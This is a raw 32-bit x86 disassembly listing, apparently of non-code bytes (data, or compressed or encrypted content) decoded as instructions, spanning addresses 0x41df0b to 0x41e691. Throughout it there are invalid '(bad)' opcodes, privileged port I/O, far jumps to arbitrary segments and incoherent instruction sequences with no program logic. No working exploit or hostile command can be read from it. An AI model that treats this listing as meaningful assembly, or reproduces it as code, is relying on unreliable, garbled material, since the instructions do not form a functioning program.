  41df0b:	leave  
  41df0c:	jecxz  0x41df6b
  41df0e:	jne    0x41df6a
  41df10:	rcl    DWORD PTR [esi+ebp*1-0x3b5a6a38],0xbc
  41df18:	add    eax,0xca54a575
  41df1d:	(bad)  
  41df1e:	push   esp
  41df1f:	mov    dh,0xcd
  41df21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df22:	addr16 aas 
  41df24:	or     eax,0x69c93019
  41df29:	mov    ebx,0xe06a9b8
  41df2e:	dec    ebp
  41df2f:	push   esp
  41df30:	nop
  41df31:	add    al,BYTE PTR [edx-0x5a0c5913]
  41df37:	dec    edx
  41df38:	xchg   esi,eax
  41df39:	pushf  
  41df3a:	adc    dh,0x75
  41df3d:	ds push ebx
  41df3f:	out    0x1e,eax
  41df41:	(bad)  
  41df42:	cmp    BYTE PTR [ecx+0x1c],dh
  41df45:	xlat   BYTE PTR ds:[ebx]
  41df46:	jl     0x41df61
  41df48:	xchg   esi,eax
  41df49:	cs cld 
  41df4b:	ja     0x41df97
  41df4d:	mov    ?,WORD PTR [ebx+0x36]
  41df50:	int    0x9
  41df52:	test   dh,0xda
  41df55:	inc    ebp
  41df56:	mov    gs,WORD PTR [eax]
  41df58:	les    ebx,FWORD PTR [ebp-0x43ac0efc]
  41df5e:	mov    ch,0x3b
  41df60:	lods   eax,DWORD PTR ds:[esi]
  41df61:	or     al,0x61
  41df63:	(bad)  
  41df64:	mov    ebp,0x86f1fbc1
  41df69:	into   
  41df6a:	adc    al,BYTE PTR [ecx-0x28]
  41df6d:	ret    0xd06
  41df70:	pop    ebp
  41df71:	push   edi
  41df72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df73:	aaa    
  41df74:	jmp    0x41df19
  41df76:	es mov cs,ecx
  41df79:	retf   
  41df7a:	and    eax,0x903c92c4
  41df7f:	jb     0x41dfd2
  41df81:	test   eax,0xf6b63707
  41df86:	out    dx,al
  41df87:	push   ds
  41df88:	inc    esi
  41df89:	ds jl  0x41dfce
  41df8c:	lods   al,BYTE PTR ds:[esi]
  41df8d:	out    0x99,al
  41df8f:	jg     0x41df86
  41df91:	fbstp  TBYTE PTR [ebx-0x28]
  41df94:	inc    esp
  41df95:	enter  0x9ad8,0xb2
  41df99:	mov    bh,0x24
  41df9b:	xchg   DWORD PTR [ebp+0x6a],eax
  41df9e:	dec    ebp
  41df9f:	mov    edi,0x9ea7cd43
  41dfa4:	int3   
  41dfa5:	ds mov esp,0x83b2a057
  41dfab:	push   0xffffff81
  41dfad:	cwde   
  41dfae:	dec    edi
  41dfaf:	cmp    al,0x3a
  41dfb1:	cmp    ecx,ebx
  41dfb3:	or     ebp,DWORD PTR [edx-0x24]
  41dfb6:	fld    QWORD PTR [ebp+edx*8+0x4857125b]
  41dfbd:	fst    DWORD PTR [edi+0x48]
  41dfc0:	mov    edi,0x3d2700e5
  41dfc5:	add    BYTE PTR [edx],bl
  41dfc7:	mov    BYTE PTR [esi+0x667c6cec],cl
  41dfcd:	xor    al,0xf6
  41dfcf:	inc    ebp
  41dfd0:	clc    
  41dfd1:	dec    DWORD PTR [ebp+edx*2+0x51]
  41dfd5:	inc    ebp
  41dfd6:	enter  0xca5f,0x16
  41dfda:	or     DWORD PTR [esi-0x22865bf0],eax
  41dfe0:	fisub  WORD PTR [esp+edx*4-0x5b6d34eb]
  41dfe7:	ret    
  41dfe8:	mov    ebp,0x3d67d261
  41dfed:	stc    
  41dfee:	adc    al,BYTE PTR [ecx]
  41dff0:	and    al,0xbe
  41dff2:	retf   0x5dbc
  41dff5:	inc    ecx
  41dff6:	ja     0x41e057
  41dff8:	ja     0x41e061
  41dffa:	inc    edx
  41dffb:	out    0xc4,eax
  41dffd:	mov    ecx,0x33c73d6f
  41e002:	jmp    0xb037:0x1615ed30
  41e009:	sbb    cl,bl
  41e00b:	xchg   esi,eax
  41e00c:	xchg   esi,eax
  41e00d:	push   cs
  41e00e:	mov    cl,0x28
  41e010:	icebp  
  41e011:	imul   BYTE PTR [eax+0x66fec8a9]
  41e017:	sbb    al,0xc0
  41e019:	fs leave 
  41e01b:	vcmpss xmm7,xmm6,DWORD PTR [ebx+0x2b],0x23
  41e021:	imul   DWORD PTR [eax-0x57]
  41e024:	cwde   
  41e025:	inc    esi
  41e026:	ficomp DWORD PTR [edx-0x69]
  41e029:	pop    edx
  41e02a:	ror    BYTE PTR [edx-0x6c318c50],cl
  41e030:	icebp  
  41e031:	mov    ds:0x229bc7b3,eax
  41e036:	outs   dx,BYTE PTR ds:[esi]
  41e037:	or     al,0x95
  41e039:	in     eax,0xe0
  41e03b:	mov    DWORD PTR [edi+0x5b349b70],ecx
  41e041:	mov    eax,ds:0xfdcd461e
  41e046:	xchg   esp,eax
  41e047:	popa   
  41e048:	or     DWORD PTR [ebx+0x3b977b],ecx
  41e04e:	jmp    0x110ec2fa
  41e053:	inc    edi
  41e054:	popf   
  41e055:	js     0x41e0b7
  41e057:	inc    ecx
  41e058:	jbe    0x41e043
  41e05a:	out    0x7b,eax
  41e05c:	clc    
  41e05d:	pushf  
  41e05e:	mov    al,ds:0xcf34aef0
  41e063:	cwde   
  41e064:	retf   
  41e065:	add    DWORD PTR [ebx],0x433f1eec
  41e06b:	neg    BYTE PTR [eax+edi*2+0x735fde52]
  41e072:	push   eax
  41e073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e074:	mov    ecx,DWORD PTR [ecx+0x5e0cb665]
  41e07a:	mov    ah,0xb
  41e07c:	and    ah,dh
  41e07e:	fst    DWORD PTR [ecx-0x46]
  41e081:	mov    bh,0xaf
  41e083:	and    DWORD PTR [eax-0x13],ebp
  41e086:	add    eax,0x3f16fe45
  41e08b:	shl    DWORD PTR [edi-0x68],cl
  41e08e:	lods   al,BYTE PTR ds:[esi]
  41e08f:	mov    ch,0xdc
  41e091:	xor    al,0xcf
  41e093:	sub    al,0x35
  41e095:	push   esp
  41e096:	jmp    0x41e079
  41e098:	push   edi
  41e099:	ins    BYTE PTR es:[edi],dx
  41e09a:	shr    bl,1
  41e09c:	cmp    eax,0xa2eec759
  41e0a1:	jae    0x41e10e
  41e0a3:	jmp    0xbe28:0xa27ccf22
  41e0aa:	in     eax,0x9b
  41e0ac:	call   0xae3787ed
  41e0b1:	ror    BYTE PTR [ecx+ebp*2+0x11],cl
  41e0b5:	(bad)  
  41e0b7:	xchg   edi,eax
  41e0b8:	xchg   DWORD PTR [eax-0x6e81ff95],ebx
  41e0be:	ror    bl,cl
  41e0c0:	pop    edx
  41e0c1:	inc    esp
  41e0c2:	in     eax,dx
  41e0c3:	dec    ebp
  41e0c4:	jmp    0xddc4:0x6455507e
  41e0cb:	dec    ebx
  41e0cc:	out    dx,al
  41e0cd:	push   esp
  41e0ce:	cld    
  41e0cf:	cwde   
  41e0d0:	inc    ebx
  41e0d1:	inc    ebp
  41e0d2:	xor    eax,esi
  41e0d4:	and    cl,BYTE PTR [edi+0x2526da67]
  41e0da:	fisubr DWORD PTR ss:[ebx]
  41e0dd:	push   esp
  41e0de:	sub    al,0x60
  41e0e0:	out    0xb,eax
  41e0e2:	je     0x41e0c9
  41e0e4:	jle    0x41e0a6
  41e0e6:	add    ebp,DWORD PTR [eax-0x82277c2]
  41e0ec:	adc    DWORD PTR [esi+ebx*2+0x7a4b2ca1],ebp
  41e0f3:	cmc    
  41e0f4:	jmp    0x6fbc:0xe8233a5d
  41e0fb:	(bad)  
  41e0fc:	ficom  DWORD PTR [eax-0x7c296b4a]
  41e102:	(bad)  
  41e103:	mov    esp,0xc2ec6818
  41e108:	jl     0x41e162
  41e10a:	or     DWORD PTR [eax-0x2c],ebp
  41e10d:	adc    BYTE PTR [ebx],ch
  41e10f:	or     DWORD PTR [eax],esi
  41e111:	(bad)  
  41e112:	xchg   ebp,eax
  41e113:	test   BYTE PTR [edx+0x2f5d56a7],bl
  41e119:	and    dl,BYTE PTR ds:0xf4dd6d1f
  41e11f:	movsx  esp,cl
  41e122:	in     eax,0xd5
  41e124:	mov    dl,0x83
  41e126:	push   ss
  41e127:	jmp    DWORD PTR [edi-0x610d1509]
  41e12d:	jns    0x41e192
  41e12f:	add    eax,0x8ec79d87
  41e134:	shr    dh,cl
  41e136:	loope  0x41e159
  41e138:	lods   eax,DWORD PTR ds:[esi]
  41e139:	push   es
  41e13a:	xor    BYTE PTR [edx],0x79
  41e13d:	and    DWORD PTR [edi],0x3a214998
  41e143:	push   ecx
  41e144:	jp     0x41e12e
  41e146:	push   ebp
  41e147:	je     0x41e0e1
  41e149:	(bad)  
  41e14a:	jl     0x41e0f5
  41e14c:	ret    0x5157
  41e14f:	cmp    esp,0xffffffe2
  41e152:	repz lock mov al,0xf2
  41e156:	cld    
  41e157:	pop    ss
  41e158:	mov    ss:0x7527b61b,eax
  41e15e:	mov    edx,0x85898b40
  41e163:	cmp    esi,DWORD PTR [edi]
  41e165:	or     eax,0x86e8a15e
  41e16a:	push   cs
  41e16b:	sub    DWORD PTR [edx],0xffffffbd
  41e16e:	push   ecx
  41e16f:	push   es
  41e170:	ja     0x41e110
  41e172:	add    eax,0x9b31f469
  41e177:	loop   0x41e1ab
  41e179:	xchg   edi,eax
  41e17a:	outs   dx,BYTE PTR ds:[esi]
  41e17b:	adc    eax,0x5612de3b
  41e180:	pop    es
  41e181:	loope  0x41e1d2
  41e183:	pop    ss
  41e184:	scas   eax,DWORD PTR es:[edi]
  41e185:	(bad)  
  41e186:	into   
  41e187:	and    cl,BYTE PTR [eax-0x29e71e7a]
  41e18d:	cdq    
  41e18e:	pop    ebp
  41e18f:	loope  0x41e15a
  41e191:	cmp    BYTE PTR [ecx-0x75443b8f],bh
  41e197:	sbb    eax,0xa7dd1b14
  41e19c:	hlt    
  41e19d:	sub    ecx,DWORD PTR [edi-0x2e]
  41e1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1a1:	les    ecx,FWORD PTR [ebp-0x63]
  41e1a4:	sbb    DWORD PTR [esi+esi*4],edx
  41e1a7:	push   edi
  41e1a8:	fwait
  41e1a9:	mov    ebx,0x9c6d9406
  41e1ae:	inc    edx
  41e1af:	mov    eax,0xdd4a6061
  41e1b4:	mov    ch,0x2b
  41e1b6:	ja     0x41e158
  41e1b8:	repz lahf 
  41e1ba:	mov    WORD PTR [edi],es
  41e1bc:	repnz fnstenv [edi+0x3dd7015f]
  41e1c3:	push   eax
  41e1c4:	fs (bad) 
  41e1c6:	sbb    ebp,esi
  41e1c8:	xchg   esi,eax
  41e1c9:	adc    esp,DWORD PTR [edx+0x4b]
  41e1cc:	xchg   ecx,eax
  41e1cd:	daa    
  41e1ce:	xchg   esp,eax
  41e1cf:	push   esp
  41e1d0:	sub    BYTE PTR [ebx],0xd5
  41e1d3:	loop   0x41e238
  41e1d5:	pop    eax
  41e1d6:	int    0xc0
  41e1d8:	enter  0x9ce0,0x1d
  41e1dc:	scas   al,BYTE PTR es:[edi]
  41e1dd:	add    ebp,DWORD PTR [edi+0x7e]
  41e1e0:	pop    ecx
  41e1e1:	inc    edx
  41e1e2:	jb     0x41e243
  41e1e4:	mov    al,BYTE PTR ss:[eax]
  41e1e7:	sbb    DWORD PTR [ecx],0x16
  41e1ea:	cld    
  41e1eb:	(bad)  
  41e1ec:	retf   
  41e1ed:	iret   
  41e1ee:	out    0x44,eax
  41e1f0:	sub    DWORD PTR [edi],ebp
  41e1f2:	cwde   
  41e1f3:	mov    ecx,0xa2a49674
  41e1f8:	mov    edi,0xa08f5da
  41e1fd:	push   cs
  41e1fe:	or     al,0x37
  41e200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e201:	push   cs
  41e202:	popa   
  41e203:	inc    esi
  41e204:	dec    ebx
  41e205:	loopne 0x41e1e7
  41e207:	lock ss icebp 
  41e20a:	mov    eax,ds:0x9b6af3dd
  41e20f:	cld    
  41e210:	xchg   esi,eax
  41e211:	nop
  41e212:	imul   ecx,DWORD PTR [esi+edx*8+0x51],0x73
  41e217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e218:	xchg   edx,eax
  41e219:	jo     0x41e1dd
  41e21b:	xchg   edi,eax
  41e21c:	ficom  DWORD PTR [edi-0x3f0efe0c]
  41e222:	addr16 das 
  41e224:	pop    edi
  41e225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e226:	shl    cl,1
  41e228:	xchg   edi,eax
  41e229:	xor    esi,DWORD PTR [eax-0x70a25a8f]
  41e22f:	or     edi,ecx
  41e231:	das    
  41e232:	lods   eax,DWORD PTR ds:[esi]
  41e233:	and    DWORD PTR [eax],0xbf5a9cf
  41e239:	dec    ecx
  41e23a:	sub    DWORD PTR [edi],0xffffffda
  41e23d:	ror    ebp,0x68
  41e240:	jl     0x41e22d
  41e242:	cwde   
  41e243:	dec    ebx
  41e244:	arpl   WORD PTR [esi+ebx*1+0x2c],ax
  41e248:	or     cl,dl
  41e24a:	jae    0x41e2c3
  41e24c:	inc    ecx
  41e24d:	(bad)  
  41e24e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e24f:	sbb    eax,edi
  41e251:	je     0x41e268
  41e253:	ins    DWORD PTR es:[edi],dx
  41e254:	nop
  41e255:	push   edi
  41e256:	loopne 0x41e21c
  41e258:	outs   dx,DWORD PTR ds:[esi]
  41e259:	rcl    dl,cl
  41e25b:	gs sbb eax,0x646ee2be
  41e261:	imul   ebp,DWORD PTR [eax+ecx*2],0xffffffe9
  41e265:	jle    0x41e2c4
  41e267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e268:	jns    0x41e267
  41e26a:	aam    0x6d
  41e26c:	jbe    0x41e29c
  41e26e:	mov    dh,0x82
  41e270:	fiadd  DWORD PTR [ebp+0x38]
  41e273:	add    dh,BYTE PTR [ecx+0x74]
  41e276:	pushf  
  41e277:	pusha  
  41e278:	inc    esi
  41e279:	pop    eax
  41e27a:	(bad)  
  41e27b:	jne    0x41e222
  41e27d:	mov    al,0x9b
  41e27f:	mov    bl,0x60
  41e281:	dec    ebp
  41e282:	cs mov ebp,0x1f08dbf8
  41e288:	or     al,0x49
  41e28a:	xor    al,0x26
  41e28c:	out    dx,eax
  41e28d:	jg     0x41e215
  41e28f:	cmp    ebp,DWORD PTR [edx+0x52]
  41e292:	jnp    0x41e308
  41e294:	clc    
  41e295:	adc    BYTE PTR [edx-0x66],dh
  41e298:	mov    DWORD PTR gs:[ecx+0x313cca23],eax
  41e29f:	stc    
  41e2a0:	out    dx,al
  41e2a1:	(bad)  
  41e2a2:	push   edx
  41e2a3:	push   eax
  41e2a4:	test   eax,0xc2742a4d
  41e2a9:	fcom   st(4)
  41e2ab:	fisub  WORD PTR [edx+0x6b950d6b]
  41e2b1:	jno    0x41e291
  41e2b3:	mov    ch,0x97
  41e2b5:	dec    esi
  41e2b6:	je     0x41e314
  41e2b8:	fbstp  TBYTE PTR ds:0x624226dc
  41e2be:	test   DWORD PTR [edi+0x25e6d0b2],eax
  41e2c4:	or     DWORD PTR [edx],edi
  41e2c6:	jmp    0x41e341
  41e2c8:	shl    DWORD PTR [esi],1
  41e2ca:	loop   0x41e2d8
  41e2cc:	icebp  
  41e2cd:	sbb    edx,DWORD PTR [esi*1-0x49c807c9]
  41e2d4:	imul   ebp,DWORD PTR [ecx],0x30
  41e2d7:	ins    DWORD PTR es:[di],dx
  41e2d9:	xor    edx,DWORD PTR [esi+0x64]
  41e2dc:	lds    edi,FWORD PTR [edx-0x5bc12d0c]
  41e2e2:	stc    
  41e2e3:	inc    edx
  41e2e4:	and    esi,ecx
  41e2e6:	ret    0x2c39
  41e2e9:	and    eax,0xd808f399
  41e2ee:	mov    dl,0xe7
  41e2f0:	mov    cl,0xc1
  41e2f2:	mov    ch,0x83
  41e2f4:	in     eax,dx
  41e2f5:	adc    ecx,DWORD PTR [edi+0x5a]
  41e2f8:	sub    eax,0x684ba5dd
  41e2fd:	rcl    edx,1
  41e2ff:	or     al,0x19
  41e301:	xchg   DWORD PTR [eax],ebp
  41e303:	mov    BYTE PTR [ebx],0xb
  41e306:	add    ecx,esi
  41e308:	mov    edx,0xc70f78b3
  41e30d:	call   0x4519:0x7bef3db0
  41e314:	test   BYTE PTR [esi-0x26bc1f18],bh
  41e31a:	or     eax,0x642a90cf
  41e31f:	aad    0xaa
  41e321:	test   al,0xd0
  41e323:	xor    bl,BYTE PTR [edi]
  41e325:	retf   
  41e326:	pushf  
  41e327:	jl     0x41e2ab
  41e329:	push   edi
  41e32a:	pop    es
  41e32b:	stc    
  41e32c:	jb     0x41e2c7
  41e32e:	retf   0xab52
  41e331:	and    DWORD PTR [edi-0x1fe37964],0x57419538
  41e33b:	xchg   BYTE PTR [ebx],cl
  41e33d:	adc    ecx,DWORD PTR [ebx]
  41e33f:	int3   
  41e340:	packuswb mm0,mm1
  41e343:	jns    0x41e3a6
  41e345:	das    
  41e346:	cli    
  41e347:	push   0x64896218
  41e34c:	add    al,0xc3
  41e34e:	xchg   ebp,eax
  41e34f:	push   ds
  41e350:	push   ss
  41e351:	pusha  
  41e352:	sbb    ebx,esp
  41e354:	xlat   BYTE PTR ds:[ebx]
  41e355:	dec    esi
  41e356:	mov    ch,0x36
  41e358:	outs   dx,DWORD PTR ds:[esi]
  41e359:	jnp    0x41e3c9
  41e35b:	mov    cs,WORD PTR [ecx-0x107a99e0]
  41e361:	inc    edx
  41e362:	and    BYTE PTR [ecx+0x3b34c824],dl
  41e368:	cmp    eax,0x4c74fb61
  41e36d:	inc    ebx
  41e36e:	jo     0x41e3d8
  41e370:	xlat   BYTE PTR ds:[ebx]
  41e371:	cmp    al,0x90
  41e373:	mov    edx,esi
  41e375:	xchg   ebx,eax
  41e376:	lods   eax,DWORD PTR ds:[esi]
  41e377:	jne    0x41e3b1
  41e379:	aas    
  41e37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e37b:	rcr    BYTE PTR [edi+0x271d8109],1
  41e381:	(bad)  
  41e382:	sub    eax,0xd4bacc6f
  41e387:	jb     0x41e3b1
  41e389:	retf   
  41e38a:	bound  ebp,QWORD PTR [eax]
  41e38c:	int3   
  41e38d:	das    
  41e38e:	push   edi
  41e38f:	inc    esp
  41e390:	nop
  41e391:	or     ah,BYTE PTR [ebx-0x3b4877dc]
  41e397:	repz mov ecx,0x1ad38b57
  41e39d:	loop   0x41e323
  41e39f:	ja     0x41e33e
  41e3a1:	and    DWORD PTR [ebp-0x3809be8a],0x7
  41e3a8:	adc    al,0x73
  41e3aa:	(bad)  [ebx-0x7fa5996a]
  41e3b0:	pop    ecx
  41e3b1:	mov    bh,0xff
  41e3b3:	adc    eax,0x711e9327
  41e3b8:	inc    cl
  41e3ba:	into   
  41e3bb:	xor    al,0x87
  41e3bd:	add    eax,0x277a9178
  41e3c2:	jae    0x41e3f1
  41e3c4:	shl    DWORD PTR [eax+ebp*8-0x68811037],1
  41e3cb:	test   eax,0xddd113
  41e3d0:	push   edx
  41e3d1:	js     0x41e3fc
  41e3d3:	and    al,cl
  41e3d5:	push   esp
  41e3d6:	adc    DWORD PTR [ebp-0x525d52ae],eax
  41e3dc:	xchg   esp,eax
  41e3dd:	(bad)  
  41e3de:	int3   
  41e3df:	add    al,0x53
  41e3e1:	(bad)  
  41e3e2:	pop    ss
  41e3e3:	sbb    eax,0x3ac3de2f
  41e3e8:	es ret 0x1fba
  41e3ec:	repz rol BYTE PTR [ebp-0x43],0x82
  41e3f1:	sahf   
  41e3f2:	mov    ch,0x72
  41e3f4:	loop   0x41e45d
  41e3f6:	ret    0xd408
  41e3f9:	mov    al,0xd0
  41e3fb:	inc    ebx
  41e3fc:	sbb    ah,cl
  41e3fe:	(bad)  
  41e3ff:	call   0x1d0f:0x65fc53aa
  41e406:	dec    eax
  41e407:	mov    ecx,0x1c9f9ccc
  41e40c:	xor    eax,0x24fd8118
  41e411:	jmp    0x9486:0x9468c822
  41e418:	jge    0x41e3cf
  41e41a:	push   ecx
  41e41b:	sub    ebx,ecx
  41e41d:	test   al,al
  41e41f:	aas    
  41e420:	sbb    dh,dl
  41e422:	lea    ecx,[edx-0x2e]
  41e425:	pop    ecx
  41e426:	test   DWORD PTR [esi+esi*2],0x8cb7f9ad
  41e42d:	in     al,dx
  41e42e:	inc    ebx
  41e42f:	int    0xbd
  41e431:	inc    eax
  41e432:	mov    al,0x82
  41e434:	cmp    al,0x91
  41e436:	mov    ebx,0x90a9834b
  41e43b:	fst    QWORD PTR [eax+0x39]
  41e43e:	icebp  
  41e43f:	fldenv ds:0x813c2944
  41e445:	push   0x1d
  41e447:	int3   
  41e448:	(bad)  
  41e449:	imul   edx,edx,0xb0997c56
  41e44f:	mov    dh,0x52
  41e451:	push   0xa6da6bf
  41e456:	jns    0x41e45b
  41e458:	call   0xfb2cb21f
  41e45d:	dec    edx
  41e45e:	(bad)  
  41e45f:	jne    0x41e3ef
  41e461:	mov    cl,0xb4
  41e463:	and    dl,ch
  41e465:	inc    ebp
  41e466:	jbe    0x41e3f7
  41e468:	(bad)  
  41e469:	and    eax,0xe1d14d51
  41e46e:	cmp    eax,0x3fa9d59e
  41e473:	sub    al,0x17
  41e475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e476:	sub    al,0x9b
  41e478:	pop    eax
  41e479:	jns    0x41e41c
  41e47b:	push   eax
  41e47c:	icebp  
  41e47d:	int3   
  41e47e:	mov    DWORD PTR [eax-0x198cee89],ebp
  41e484:	mov    bh,0xdb
  41e486:	lea    esi,[eax+0x15]
  41e489:	loopne 0x41e44e
  41e48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e48c:	inc    esi
  41e48d:	test   DWORD PTR [edi+0x3fe7b295],esi
  41e493:	push   DWORD PTR [eax+edi*1]
  41e496:	ror    BYTE PTR [ebx+0x72],0x6a
  41e49a:	push   0xffffffc7
  41e49c:	or     eax,0xa83d5133
  41e4a1:	push   es
  41e4a2:	xor    DWORD PTR [edi+0x5c],esi
  41e4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4a6:	jb     0x41e4b8
  41e4a8:	in     eax,0x10
  41e4aa:	shl    BYTE PTR [ecx-0x9ad5756],1
  41e4b0:	lock jne 0x41e4bf
  41e4b3:	into   
  41e4b4:	mov    ah,0xcd
  41e4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4b7:	mov    bl,0x2b
  41e4b9:	gs pushf 
  41e4bb:	lock rcr ch,cl
  41e4be:	adc    eax,0xe96345cf
  41e4c3:	and    ebp,edi
  41e4c5:	jns    0x41e4e9
  41e4c7:	in     eax,dx
  41e4c8:	or     eax,0x9a1568ea
  41e4cd:	and    ch,BYTE PTR [ebp-0x39]
  41e4d0:	dec    esp
  41e4d1:	xchg   ecx,eax
  41e4d2:	inc    edi
  41e4d3:	inc    ebx
  41e4d4:	test   al,dh
  41e4d6:	ror    BYTE PTR [ebx-0x5441be94],0xbe
  41e4dd:	paddusw mm4,QWORD PTR [edx]
  41e4e0:	(bad)  
  41e4e1:	cs lahf 
  41e4e3:	(bad)  
  41e4e4:	in     al,dx
  41e4e5:	inc    edi
  41e4e6:	call   DWORD PTR [ecx]
  41e4e8:	rcl    DWORD PTR [ebx+0x32],1
  41e4eb:	mov    esp,0xb7472ba4
  41e4f0:	push   edx
  41e4f1:	fst    st(7)
  41e4f3:	fisttp DWORD PTR [ebp+0x5b]
  41e4f6:	loop   0x41e502
  41e4f8:	jmp    0x9cc:0x7a5dbbb6
  41e4ff:	xchg   edi,eax
  41e500:	push   ebp
  41e501:	mov    ebx,0x1a73e5d9
  41e506:	xchg   ebx,eax
  41e507:	pop    ds
  41e508:	scas   eax,DWORD PTR es:[edi]
  41e509:	add    BYTE PTR [edx+0x4f1d2ec],ah
  41e50f:	inc    DWORD PTR [ecx]
  41e511:	icebp  
  41e512:	stc    
  41e513:	pop    ebp
  41e514:	pop    ebx
  41e515:	outs   dx,DWORD PTR ds:[esi]
  41e516:	mov    ?,WORD PTR [ebp+0x573fe049]
  41e51c:	mov    ebp,0x6c142ca8
  41e521:	push   ebp
  41e522:	pop    esp
  41e523:	hlt    
  41e524:	sti    
  41e525:	(bad)  
  41e526:	jnp    0x41e53b
  41e528:	fs pop esi
  41e52a:	sti    
  41e52b:	mov    ds:0x65c1fbaf,al
  41e530:	sbb    BYTE PTR [ecx],0x8c
  41e533:	sbb    eax,0x903eded7
  41e538:	pop    ebx
  41e539:	stos   BYTE PTR es:[edi],al
  41e53a:	div    BYTE PTR [ebp+0x1bac87f1]
  41e540:	push   ebx
  41e541:	(bad)
  41e544:	mov    bl,0x23
  41e546:	lock push eax
  41e548:	inc    edi
  41e549:	push   eax
  41e54a:	lea    ebp,[edx+0x613a0313]
  41e550:	mov    esp,0x33b9c331
  41e555:	pop    es
  41e556:	out    0x8e,eax
  41e558:	loop   0x41e5a9
  41e55a:	xor    al,0xb2
  41e55c:	fidiv  DWORD PTR [eax*2+0x77ef8d38]
  41e563:	cmc    
  41e564:	mov    esi,0x4a02b598
  41e569:	adc    eax,0xee628501
  41e56e:	addr16 leave 
  41e570:	inc    esp
  41e571:	lahf   
  41e572:	fisttp DWORD PTR [ecx+ecx*1]
  41e575:	sar    esp,cl
  41e577:	addr16 ja 0x41e5d3
  41e57a:	jns    0x41e5de
  41e57c:	push   ebx
  41e57d:	loopne 0x41e589
  41e57f:	inc    eax
  41e580:	mov    fs,WORD PTR [eax+edi*4+0x45]
  41e584:	pop    edi
  41e585:	(bad)  
  41e586:	loopne 0x41e53b
  41e588:	icebp  
  41e589:	sbb    bl,BYTE PTR [esi-0x73226ce2]
  41e58f:	or     esi,ecx
  41e591:	popf   
  41e592:	pop    ebx
  41e593:	cmp    dh,bl
  41e595:	pop    esi
  41e596:	fwait
  41e597:	sahf   
  41e598:	lahf   
  41e599:	popf   
  41e59a:	pop    es
  41e59b:	jbe    0x41e569
  41e59d:	stos   DWORD PTR es:[edi],eax
  41e59e:	xchg   ecx,eax
  41e59f:	call   0x5a8f:0xbbf4a4c7
  41e5a6:	aad    0x46
  41e5a8:	mov    ecx,0x787d30ba
  41e5ad:	loopne 0x41e54f
  41e5af:	sub    BYTE PTR [ebx+0x2605b6f2],dl
  41e5b5:	xchg   esi,eax
  41e5b6:	imul   ebp,DWORD PTR [esi],0x45
  41e5b9:	in     eax,0xd6
  41e5bb:	scas   al,BYTE PTR es:[edi]
  41e5bc:	mov    edx,0xf9914c6f
  41e5c1:	rcl    BYTE PTR [esi-0x6e],0x80
  41e5c5:	enter  0xdf02,0xa8
  41e5c9:	inc    ebp
  41e5ca:	fs lock pop ds
  41e5cd:	adc    al,0x4d
  41e5cf:	adc    ah,BYTE PTR [ebx+0x49]
  41e5d2:	lea    esp,[ebp+0x1443ab1]
  41e5d8:	jl     0x41e5f6
  41e5da:	pop    ss
  41e5db:	inc    edx
  41e5dc:	scas   eax,DWORD PTR es:[edi]
  41e5dd:	adc    ecx,esp
  41e5df:	and    bh,ch
  41e5e1:	inc    edi
  41e5e2:	in     al,0xa
  41e5e4:	inc    edx
  41e5e5:	idiv   dh
  41e5e7:	push   eax
  41e5e8:	dec    edx
  41e5e9:	test   al,0x4d
  41e5eb:	sub    BYTE PTR [ebx-0x6a877038],dh
  41e5f1:	fucomp st(5)
  41e5f3:	sar    DWORD PTR ds:0xfd1eab79,0x73
  41e5fa:	jl     0x41e652
  41e5fc:	sti    
  41e5fd:	test   al,0x58
  41e5ff:	in     eax,0xaa
  41e601:	and    al,0xa2
  41e603:	int3   
  41e604:	or     eax,0x83cf8d38
  41e609:	(bad)
  41e60c:	mov    al,0x10
  41e60e:	idiv   BYTE PTR [ebp-0x2a63390]
  41e614:	and    cl,BYTE PTR [eax+0x13f4afec]
  41e61a:	inc    ebx
  41e61b:	mov    DWORD PTR [edx-0x2afc7fd9],edx
  41e621:	sar    dh,cl
  41e623:	sub    BYTE PTR [eax+0x4b],dl
  41e626:	xor    BYTE PTR [ebx+edx*8-0x35a57e18],cl
  41e62d:	aaa    
  41e62e:	retf   
  41e62f:	jo     0x41e640
  41e631:	sub    DWORD PTR ds:0x784eb7dd,ebx
  41e637:	xchg   ebp,eax
  41e638:	jb     0x41e602
  41e63a:	pop    esi
  41e63b:	cmp    eax,0x94c7c96d
  41e640:	lods   al,BYTE PTR ds:[esi]
  41e641:	fs retf 0x6d18
  41e645:	mov    ebx,0x9a1cd0e1
  41e64a:	sub    BYTE PTR [ebp+ebp*4+0x4f],dh
  41e64e:	adc    ecx,DWORD PTR [eax+edi*2]
  41e651:	popa   
  41e652:	mov    edx,DWORD PTR [edi]
  41e654:	sub    DWORD PTR [ebx],ebx
  41e656:	sbb    BYTE PTR [edi+0x18800501],cl
  41e65c:	lock sti 
  41e65e:	cmc    
  41e65f:	jns    0x41e649
  41e661:	repz aam 0x16
  41e664:	push   es
  41e665:	mov    edx,0xd42a7227
  41e66a:	sti    
  41e66b:	das    
  41e66c:	mov    ebp,0x33403001
  41e671:	lods   eax,DWORD PTR ds:[esi]
  41e672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e673:	lods   eax,DWORD PTR ds:[esi]
  41e674:	mov    ecx,0x285a4242
  41e679:	dec    ebp
  41e67a:	mov    esi,0x2dbdce9d
  41e67f:	jnp    0x41e63f
  41e681:	nop
  41e682:	fwait
  41e683:	mov    ds:0x3396887c,al
  41e688:	stos   BYTE PTR es:[edi],al
  41e689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e68a:	jge    0x41e682
  41e68c:	cmp    al,BYTE PTR [ecx-0x55]
  41e68f:	pusha  
  41e690:	push   cs
  41e691:	dec    ebp
